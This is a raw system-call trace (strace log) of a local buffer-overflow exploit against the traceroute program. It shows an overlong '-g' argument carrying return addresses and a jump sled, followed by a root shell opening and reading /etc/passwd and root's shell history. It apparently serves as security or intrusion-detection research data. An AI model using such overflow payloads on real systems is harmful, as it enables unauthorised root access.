 execve("/usr/sbin/traceroute", ["/usr/sbin/traceroute", "-g", "1", "-g", "1"], [/* 0 vars */]) = 0 <0.000253>
 brk(0)        = 0x804cedc <0.000007>
 old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40014000 <0.000012>
 open("/etc/ld.so.preload", O_RDONLY) = -1 ENOENT (No such file or directory) <0.000023>
 open("/etc/ld.so.cache", O_RDONLY) = 4 <0.000016>
 fstat(4, {st_mode=S_IFREG|0644, st_size=12210, ...}) = 0 <0.000008>
 old_mmap(NULL, 12210, PROT_READ, MAP_PRIVATE, 4, 0) = 0x40015000 <0.000011>
 close(4)      = 0 <0.000007>
 open("/lib/libc.so.6", O_RDONLY) = 4 <0.000020>
 fstat(4, {st_mode=S_IFREG|0755, st_size=4101324, ...}) = 0 <0.000007>
 read(4, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\210\212"..., 4096) = 4096 <0.000031>
 old_mmap(NULL, 1001564, PROT_READ|PROT_EXEC, MAP_PRIVATE, 4, 0) = 0x40018000 <0.000014>
 mprotect(0x40105000, 30812, PROT_NONE) = 0 <0.000012>
 old_mmap(0x40105000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 4, 0xec000) = 0x40105000 <0.000015>
 old_mmap(0x40109000, 14428, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x40109000 <0.000010>
 close(4)      = 0 <0.000006>
 mprotect(0x40018000, 970752, PROT_READ|PROT_WRITE) = 0 <0.000013>
 mprotect(0x40018000, 970752, PROT_READ|PROT_EXEC) = 0 <0.000023>
 munmap(0x40015000, 12210) = 0 <0.000021>
 personality(PER_LINUX) = 0 <0.000008>
 getpid()      = 797 <0.000007>
 brk(0)        = 0x804cedc <0.000009>
 brk(0x804cefc) = 0x804cefc <0.000006>
 brk(0x804d000) = 0x804d000 <0.000006>
 brk(0x804e000) = 0x804e000 <0.000014>
 write(1, "VULN!\n", 6) = 6 <0.000055>
 write(1, "Lets ride...\n", 13) = 13 <0.000048>
 write(1, "Trying bfffff89\n", 16) = 16 <0.000048>
 execve("/usr/sbin/traceroute", ["exploited", "-g", "1.2.34", "-g", "1.2.3.17 sex\374\377\377\377\270\307\4\10\211\377\377\277"..., "\353\n\353\n\353\n\353\n\353\n\353\n\353\n\353\n\353\n"...], [/* 0 vars */]) = 0 <0.000294>
 brk(0)        = 0x804cedc <0.000007>
 old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40014000 <0.000011>
 open("/etc/ld.so.preload", O_RDONLY) = -1 ENOENT (No such file or directory) <0.000019>
 open("/etc/ld.so.cache", O_RDONLY) = 4 <0.000016>
 fstat(4, {st_mode=S_IFREG|0644, st_size=12210, ...}) = 0 <0.000008>
 old_mmap(NULL, 12210, PROT_READ, MAP_PRIVATE, 4, 0) = 0x40015000 <0.000012>
 close(4)      = 0 <0.000008>
 open("/lib/libc.so.6", O_RDONLY) = 4 <0.000019>
 fstat(4, {st_mode=S_IFREG|0755, st_size=4101324, ...}) = 0 <0.000008>
 read(4, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\210\212"..., 4096) = 4096 <0.000031>
 old_mmap(NULL, 1001564, PROT_READ|PROT_EXEC, MAP_PRIVATE, 4, 0) = 0x40018000 <0.000014>
 mprotect(0x40105000, 30812, PROT_NONE) = 0 <0.000014>
 old_mmap(0x40105000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 4, 0xec000) = 0x40105000 <0.000014>
 old_mmap(0x40109000, 14428, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x40109000 <0.000010>
 close(4)      = 0 <0.000008>
 mprotect(0x40018000, 970752, PROT_READ|PROT_WRITE) = 0 <0.000013>
 mprotect(0x40018000, 970752, PROT_READ|PROT_EXEC) = 0 <0.000020>
 munmap(0x40015000, 12210) = 0 <0.000020>
 personality(PER_LINUX) = 0 <0.000007>
 getpid()      = 796 <0.000007>
 brk(0)        = 0x804cedc <0.000007>
 brk(0x804cefc) = 0x804cefc <0.000007>
 brk(0x804d000) = 0x804d000 <0.000005>
 brk(0x804e000) = 0x804e000 <0.000014>
 execve("/bin/sh", ["/bin/sh"], [/* 0 vars */]) = 0 <0.000278>
 brk(0)        = 0x80994a0 <0.000006>
 old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40014000 <0.000011>
 open("/etc/ld.so.preload", O_RDONLY) = -1 ENOENT (No such file or directory) <0.000020>
 open("/etc/ld.so.cache", O_RDONLY) = 4 <0.000014>
 fstat(4, {st_mode=S_IFREG|0644, st_size=12210, ...}) = 0 <0.000010>
 old_mmap(NULL, 12210, PROT_READ, MAP_PRIVATE, 4, 0) = 0x40015000 <0.000012>
 close(4)      = 0 <0.000007>
 open("/lib/libtermcap.so.2", O_RDONLY) = 4 <0.000022>
 fstat(4, {st_mode=S_IFREG|0755, st_size=12224, ...}) = 0 <0.000008>
 read(4, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\16\0"..., 4096) = 4096 <0.000040>
 old_mmap(NULL, 15304, PROT_READ|PROT_EXEC, MAP_PRIVATE, 4, 0) = 0x40018000 <0.000010>
 mprotect(0x4001b000, 3016, PROT_NONE) = 0 <0.000011>
 old_mmap(0x4001b000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 4, 0x2000) = 0x4001b000 <0.000014>
 close(4)      = 0 <0.000007>
 open("/lib/libc.so.6", O_RDONLY) = 4 <0.000023>
 fstat(4, {st_mode=S_IFREG|0755, st_size=4101324, ...}) = 0 <0.000007>
 read(4, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\210\212"..., 4096) = 4096 <0.000032>
 old_mmap(NULL, 1001564, PROT_READ|PROT_EXEC, MAP_PRIVATE, 4, 0) = 0x4001c000 <0.000012>
 mprotect(0x40109000, 30812, PROT_NONE) = 0 <0.000009>
 old_mmap(0x40109000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 4, 0xec000) = 0x40109000 <0.000013>
 old_mmap(0x4010d000, 14428, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x4010d000 <0.000010>
 close(4)      = 0 <0.000007>
 mprotect(0x4001c000, 970752, PROT_READ|PROT_WRITE) = 0 <0.000015>
 mprotect(0x4001c000, 970752, PROT_READ|PROT_EXEC) = 0 <0.000024>
 munmap(0x40015000, 12210) = 0 <0.000025>
 personality(PER_LINUX) = 0 <0.000007>
 getpid()      = 796 <0.000007>
 getuid()      = 0 <0.000006>
 getgid()      = 0 <0.000005>
 geteuid()     = 0 <0.000006>
 getegid()     = 0 <0.000005>
 brk(0)        = 0x80994a0 <0.000007>
 brk(0x80994c0) = 0x80994c0 <0.000006>
 brk(0x809a000) = 0x809a000 <0.000006>
 time(NULL)    = 1142549677 <0.000006>
 ioctl(0, TCGETS, {B38400 opost isig icanon echo ...}) = 0 <0.000017>
 ioctl(1, TCGETS, {B38400 opost isig icanon echo ...}) = 0 <0.000008>
 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0 <0.000010>
 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0 <0.000007>
 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0 <0.000007>
 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0 <0.000006>
 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_DFL}, 8) = 0 <0.000006>
 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_DFL}, 8) = 0 <0.000006>
 rt_sigaction(SIGTERM, {SIG_DFL}, {SIG_DFL}, 8) = 0 <0.000006>
 rt_sigaction(SIGTERM, {SIG_DFL}, {SIG_DFL}, 8) = 0 <0.000006>
 rt_sigaction(SIGHUP, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000008>
 rt_sigaction(SIGINT, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000006>
 rt_sigaction(SIGILL, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000006>
 rt_sigaction(SIGTRAP, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000007>
 rt_sigaction(SIGABRT, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000007>
 rt_sigaction(SIGFPE, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000007>
 rt_sigaction(SIGBUS, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000006>
 rt_sigaction(SIGSEGV, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000006>
 rt_sigaction(SIGUNUSED, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000006>
 rt_sigaction(SIGPIPE, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000007>
 rt_sigaction(SIGALRM, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000007>
 rt_sigaction(SIGTERM, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000006>
 rt_sigaction(SIGXCPU, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000007>
 rt_sigaction(SIGXFSZ, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000006>
 rt_sigaction(SIGVTALRM, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000006>
 rt_sigaction(SIGPROF, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000007>
 rt_sigaction(SIGUSR1, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000007>
 rt_sigaction(SIGUSR2, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000006>
 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0 <0.000006>
 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0 <0.000007>
 rt_sigaction(SIGINT, {0x804bc20, [], 0x4000000}, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, 8) = 0 <0.000006>
 rt_sigaction(SIGTERM, {SIG_IGN}, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, 8) = 0 <0.000007>
 rt_sigaction(SIGINT, {0x804bc20, [], 0x4000000}, {0x804bc20, [], 0x4000000}, 8) = 0 <0.000006>
 rt_sigaction(SIGTSTP, {SIG_IGN}, {SIG_DFL}, 8) = 0 <0.000006>
 rt_sigaction(SIGTTOU, {SIG_IGN}, {SIG_DFL}, 8) = 0 <0.000006>
 rt_sigaction(SIGTTIN, {SIG_IGN}, {SIG_DFL}, 8) = 0 <0.000006>
 socket(PF_UNIX, SOCK_STREAM, 0) = 4 <0.000031>
 connect(4, {sin_family=AF_UNIX, path="                                                                                       /var/run/.nscd_socket"}, 110) = -1 ECONNREFUSED (Connection refused) <0.000027>
 close(4)      = 0 <0.000039>
 open("/etc/nsswitch.conf", O_RDONLY) = 4 <0.000024>
 fstat64(0x4, 0xbffffba0) = -1 ENOSYS (Function not implemented) <0.000007>
 fstat(4, {st_mode=S_IFREG|0644, st_size=1744, ...}) = 0 <0.000008>
 old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40015000 <0.000017>
 read(4, "#\n# /etc/nsswitch.conf\n#\n# An ex"..., 4096) = 1744 <0.000046>
 brk(0x809b000) = 0x809b000 <0.000010>
 read(4, "", 4096) = 0 <0.000007>
 close(4)      = 0 <0.000009>
 munmap(0x40015000, 4096) = 0 <0.000016>
 open("/etc/ld.so.cache", O_RDONLY) = 4 <0.000024>
 fstat(4, {st_mode=S_IFREG|0644, st_size=12210, ...}) = 0 <0.000008>
 old_mmap(NULL, 12210, PROT_READ, MAP_PRIVATE, 4, 0) = 0x40015000 <0.000015>
 close(4)      = 0 <0.000006>
 open("/lib/libnss_files.so.2", O_RDONLY) = 4 <0.000025>
 fstat(4, {st_mode=S_IFREG|0755, st_size=246652, ...}) = 0 <0.000008>
 read(4, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p \0\000"..., 4096) = 4096 <0.000036>
 old_mmap(NULL, 36384, PROT_READ|PROT_EXEC, MAP_PRIVATE, 4, 0) = 0x40111000 <0.000013>
 mprotect(0x40119000, 3616, PROT_NONE) = 0 <0.000011>
 old_mmap(0x40119000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 4, 0x7000) = 0x40119000 <0.000013>
 close(4)      = 0 <0.000006>
 munmap(0x40015000, 12210) = 0 <0.000015>
 open("/etc/passwd", O_RDONLY) = 4 <0.000028>
 fcntl(4, F_GETFD) = 0 <0.000007>
 fcntl(4, F_SETFD, FD_CLOEXEC) = 0 <0.000006>
 fstat(4, {st_mode=S_IFREG|0644, st_size=704, ...}) = 0 <0.000008>
 old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40015000 <0.000014>
 read(4, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 704 <0.000036>
 close(4)      = 0 <0.000009>
 munmap(0x40015000, 4096) = 0 <0.000010>
 uname({sys="Linux", node="localhost.localdomain", ...}) = 0 <0.000013>
 open("/etc/ld.so.cache", O_RDONLY) = 4 <0.000024>
 fstat(4, {st_mode=S_IFREG|0644, st_size=12210, ...}) = 0 <0.000008>
 old_mmap(NULL, 12210, PROT_READ, MAP_PRIVATE, 4, 0) = 0x40015000 <0.000017>
 close(4)      = 0 <0.000006>
 open("/lib/libnss_nisplus.so.2", O_RDONLY) = 4 <0.000049>
 fstat(4, {st_mode=S_IFREG|0755, st_size=252234, ...}) = 0 <0.000008>
 read(4, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\37\0"..., 4096) = 4096 <0.000036>
 old_mmap(NULL, 41972, PROT_READ|PROT_EXEC, MAP_PRIVATE, 4, 0) = 0x4011a000 <0.000014>
 mprotect(0x40123000, 5108, PROT_NONE) = 0 <0.000011>
 old_mmap(0x40123000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 4, 0x8000) = 0x40123000 <0.000014>
 close(4)      = 0 <0.000007>
 open("/lib/libnsl.so.1", O_RDONLY) = 4 <0.000026>
 fstat(4, {st_mode=S_IFREG|0755, st_size=370141, ...}) = 0 <0.000008>
 read(4, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20?\0\000"..., 4096) = 4096 <0.000035>
 old_mmap(NULL, 88104, PROT_READ|PROT_EXEC, MAP_PRIVATE, 4, 0) = 0x40125000 <0.000012>
 mprotect(0x40137000, 14376, PROT_NONE) = 0 <0.000009>
 old_mmap(0x40137000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 4, 0x11000) = 0x40137000 <0.000013>
 old_mmap(0x40139000, 6184, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x40139000 <0.000011>
 close(4)      = 0 <0.000008>
 munmap(0x40015000, 12210) = 0 <0.000017>
 open("/etc/ld.so.cache", O_RDONLY) = 4 <0.000028>
 fstat(4, {st_mode=S_IFREG|0644, st_size=12210, ...}) = 0 <0.000009>
 old_mmap(NULL, 12210, PROT_READ, MAP_PRIVATE, 4, 0) = 0x40015000 <0.000015>
 close(4)      = 0 <0.000006>
 open("/lib/libnss_nis.so.2", O_RDONLY) = 4 <0.000022>
 fstat(4, {st_mode=S_IFREG|0755, st_size=255963, ...}) = 0 <0.000007>
 read(4, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0`\37\0\000"..., 4096) = 4096 <0.000037>
 old_mmap(NULL, 38488, PROT_READ|PROT_EXEC, MAP_PRIVATE, 4, 0) = 0x4013b000 <0.000015>
 mprotect(0x40143000, 5720, PROT_NONE) = 0 <0.000013>
 old_mmap(0x40143000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 4, 0x7000) = 0x40143000 <0.000014>
 close(4)      = 0 <0.000007>
 munmap(0x40015000, 12210) = 0 <0.000015>
 brk(0x809c000) = 0x809c000 <0.000012>
 brk(0x809e000) = 0x809e000 <0.000010>
 getcwd("/home/kayacik/exploit", 4095) = 22 <0.000012>
 getpid()      = 796 <0.000006>
 getppid()     = 795 <0.000007>
 getuid()      = 0 <0.000005>
 open("/etc/passwd", O_RDONLY) = 4 <0.000028>
 fcntl(4, F_GETFD) = 0 <0.000007>
 fcntl(4, F_SETFD, FD_CLOEXEC) = 0 <0.000006>
 fstat(4, {st_mode=S_IFREG|0644, st_size=704, ...}) = 0 <0.000007>
 old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40015000 <0.000017>
 read(4, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 704 <0.000034>
 close(4)      = 0 <0.000011>
 munmap(0x40015000, 4096) = 0 <0.000011>
 getpgrp()     = 795 <0.000006>
 dup(2)        = 4 <0.000009>
 getrlimit(RLIMIT_NOFILE, {rlim_cur=1024, rlim_max=1024}) = 0 <0.000006>
 fcntl(255, F_GETFD) = -1 EBADF (Bad file descriptor) <0.000006>
 dup2(4, 255)  = 255 <0.000020>
 close(4)      = 0 <0.000007>
 ioctl(255, TIOCGPGRP, [795]) = 0 <0.000014>
 getpid()      = 796 <0.000006>
 setpgid(0, 796) = 0 <0.000007>
 rt_sigprocmask(SIG_BLOCK, [CHLD TSTP TTIN TTOU], [], 8) = 0 <0.000009>
 ioctl(255, TIOCSPGRP, [796]) = 0 <0.000026>
 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0 <0.000006>
 fcntl(255, F_SETFD, FD_CLOEXEC) = 0 <0.000007>
 rt_sigaction(SIGCHLD, {0x805c190, [], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000009>
 ioctl(255, TCGETS, {B38400 opost isig icanon echo ...}) = 0 <0.000013>
 stat("/var/spool/mail/root", 0xbffffdb0) = -1 ENOENT (No such file or directory) <0.000037>
 time(NULL)    = 1142549677 <0.000007>
 open("/root/.bash_history", O_RDONLY) = 4 <0.000026>
 fstat(4, {st_mode=S_IFREG|0600, st_size=2000, ...}) = 0 <0.000007>
 read(4, "whoami\nexit\nexit\nftp localhost\n/"..., 2000) = 2000 <0.000026>
 close(4)      = 0 <0.000009>
 stat("/root/.bash_history", {st_mode=S_IFREG|0600, st_size=2000, ...}) = 0 <0.000014>
 open("/root/.bash_history", O_RDONLY) = 4 <0.000014>
 fstat(4, {st_mode=S_IFREG|0600, st_size=2000, ...}) = 0 <0.000006>
 read(4, "whoami\nexit\nexit\nftp localhost\n/"..., 2000) = 2000 <0.000018>
 close(4)      = 0 <0.000007>
 brk(0x809f000) = 0x809f000 <0.000016>
 brk(0x80a0000) = 0x80a0000 <0.000010>
 ioctl(255, TCGETS, {B38400 opost isig icanon echo ...}) = 0 <0.000013>
 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) <0.000007>
 rt_sigaction(SIGINT, {0x804bc20, [], 0x4000000}, {0x804bc20, [], 0x4000000}, 8) = 0 <0.000007>
 time(NULL)    = 1142549677 <0.000006>
 geteuid()     = 0 <0.000007>
 geteuid()     = 0 <0.000006>
 rt_sigprocmask(SIG_BLOCK, [CHLD TTOU], [], 8) = 0 <0.000008>
 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0 <0.000005>
 rt_sigprocmask(SIG_BLOCK, [CHLD TSTP TTIN TTOU], [], 8) = 0 <0.000008>
 ioctl(255, TIOCSPGRP, [796]) = 0 <0.000028>
 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0 <0.000006>
 rt_sigaction(SIGINT, {0x804bc20, [], 0x4000000}, {0x804bc20, [], 0x4000000}, 8) = 0 <0.000006>
 brk(0x80a1000) = 0x80a1000 <0.000016>
 open("/etc/termcap", O_RDONLY) = 4 <0.000027>
 fstat(4, {st_mode=S_IFREG|0644, st_size=625272, ...}) = 0 <0.000009>
 old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40015000 <0.000015>
 _llseek(4, 0, [0], SEEK_SET) = 0 <0.000008>
 read(4, "######## TERMINAL TYPE DESCRIPTI"..., 4096) = 4096 <0.000054>
 read(4, "or their hardware\n# (notably DEC"..., 4096) = 4096 <0.000026>
 read(4, "The terminal enquire string <u9>"..., 4096) = 4096 <0.000026>
 read(4, " redistribute freely.\n# There ar"..., 4096) = 4096 <0.000023>
 close(4)      = 0 <0.000010>
 munmap(0x40015000, 4096) = 0 <0.000012>
 ioctl(0, TIOCGWINSZ, {ws_row=25, ws_col=80, ws_xpixel=0, ws_ypixel=0}) = 0 <0.000010>
 ioctl(0, TIOCGWINSZ, {ws_row=25, ws_col=80, ws_xpixel=0, ws_ypixel=0}) = 0 <0.000007>
 ioctl(0, TCGETS, {B38400 opost isig icanon echo ...}) = 0 <0.000011>
 getuid()      = 0 <0.000006>
 open("/etc/passwd", O_RDONLY) = 4 <0.000025>
 fcntl(4, F_GETFD) = 0 <0.000007>
 fcntl(4, F_SETFD, FD_CLOEXEC) = 0 <0.000006>
 fstat(4, {st_mode=S_IFREG|0644, st_size=704, ...}) = 0 <0.000008>
 old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40015000 <0.000015>
 read(4, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 704 <0.000034>
 close(4)      = 0 <0.000009>
 munmap(0x40015000, 4096) = 0 <0.000011>
 stat("/root/.inputrc", 0xbffff4b8) = -1 ENOENT (No such file or directory) <0.000027>
 brk(0x80a2000) = 0x80a2000 <0.000013>
 brk(0x80a3000) = 0x80a3000 <0.000009>
 brk(0x80a4000) = 0x80a4000 <0.000009>
 rt_sigprocmask(SIG_BLOCK, [INT], [], 8) = 0 <0.000008>
 ioctl(0, TCGETS, {B38400 opost isig icanon echo ...}) = 0 <0.000014>
 ioctl(0, SNDCTL_TMR_START, {B38400 opost isig -icanon -echo ...}) = 0 <0.000016>
 ioctl(0, TCGETS, {B38400 opost isig -icanon -echo ...}) = 0 <0.000009>
 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0 <0.000007>
 rt_sigaction(SIGINT, {0x807d4d0, [], 0x4000000}, {0x804bc20, [], 0x4000000}, 8) = 0 <0.000010>
 rt_sigaction(SIGALRM, {0x807d4d0, [], 0x4000000}, {0x804b8c0, [HUP INT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM XCPU XFSZ VTALRM PROF UNUSED], 0x4000000}, 8) = 0 <0.000006>
 rt_sigaction(SIGWINCH, {0x807d490, [], 0x4000000}, {SIG_DFL}, 8) = 0 <0.000007>
 fstat(2, {st_mode=S_IFCHR|0620, st_rdev=makedev(4, 1), ...}) = 0 <0.000011>
 old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40015000 <0.000017>
 ioctl(2, TCGETS, {B38400 opost isig -icanon -echo ...}) = 0 <0.000010>
 write(2, "bash# ", 6) = 6 <0.000045>
 read(0, "e", 1) = 1 <4.780224>
 write(2, "e", 1) = 1 <0.000029>
 read(0, "x", 1) = 1 <0.219311>
 write(2, "x", 1) = 1 <0.000022>
 read(0, "i", 1) = 1 <0.154146>
 write(2, "i", 1) = 1 <0.000022>
 read(0, "t", 1) = 1 <0.162114>
 write(2, "t", 1) = 1 <0.000020>
 read(0, "\r", 1) = 1 <0.132661>
 write(2, "\n", 1) = 1 <0.000048>
 rt_sigprocmask(SIG_BLOCK, [INT], [], 8) = 0 <0.000009>
 ioctl(0, SNDCTL_TMR_START, {B38400 opost isig icanon echo ...}) = 0 <0.000022>
 ioctl(0, TCGETS, {B38400 opost isig icanon echo ...}) = 0 <0.000006>
 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0 <0.000005>
 rt_sigaction(SIGINT, {0x804bc20, [], 0x4000000}, {0x807d4d0, [], 0x4000000}, 8) = 0 <0.000008>
 rt_sigaction(SIGALRM, {0x804b8c0, [], 0x4000000}, {0x807d4d0, [], 0x4000000}, 8) = 0 <0.000006>
 rt_sigaction(SIGWINCH, {SIG_DFL}, {0x807d490, [], 0x4000000}, 8) = 0 <0.000007>
 rt_sigaction(SIGINT, {0x804bc20, [], 0x4000000}, {0x804bc20, [], 0x4000000}, 8) = 0 <0.000007>
 brk(0x80a5000) = 0x80a5000 <0.000018>
 write(2, "exit\n", 5) = 5 <0.000058>
 rt_sigaction(SIGINT, {0x804bc20, [], 0x4000000}, {0x804bc20, [], 0x4000000}, 8) = 0 <0.000008>
 stat("/root/.bash_history", {st_mode=S_IFREG|0600, st_size=2000, ...}) = 0 <0.000027>
 open("/root/.bash_history", O_WRONLY|O_APPEND) = 4 <0.000018>
 write(4, "exit\n", 5) = 5 <0.000016>
 close(4)      = 0 <0.000010>
 rt_sigprocmask(SIG_BLOCK, [CHLD TSTP TTIN TTOU], [], 8) = 0 <0.000007>
 ioctl(255, TIOCSPGRP, [795]) = 0 <0.000030>
 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0 <0.000006>
 setpgid(0, 795) = 0 <0.000022>
 munmap(0x40015000, 4096) = 0 <0.000019>
 _exit(0)      = ?
